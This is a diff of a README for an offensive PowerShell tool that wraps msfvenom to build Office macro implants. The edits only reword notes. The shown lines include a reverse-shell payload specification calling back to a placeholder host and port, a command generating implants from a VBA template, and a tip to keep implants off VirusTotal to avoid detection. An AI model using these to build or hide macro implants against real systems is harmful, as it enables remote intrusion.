@@ -11,7 +11,7 @@ This `PowerShell` script can be viewed as *kind of* a third-party add-on to [MSF
 
 Users/stargazers are greatly encouraged toward contributing to improving and extending this project. 🐺
 
-### ⚠️ Do not be a dummy... Do not submit the produced implants to VirusTotal. 🤢
+### ⚠️ Do not be a dummy... NEVER submit any implant to VirusTotal. 🤢
 
 ## Features
 
@@ -46,7 +46,7 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
         Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
     ```
 
-> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
+> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder in the above example... 🙄
 
 ## Usage
 
@@ -88,7 +88,7 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
     > [!WARNING]
     > The length of the key must be shorted than the shellcode.
 
-> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values in the above examples... 🙄
+> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder in the above examples... 🙄
 
 ## Sponsor 💓
 
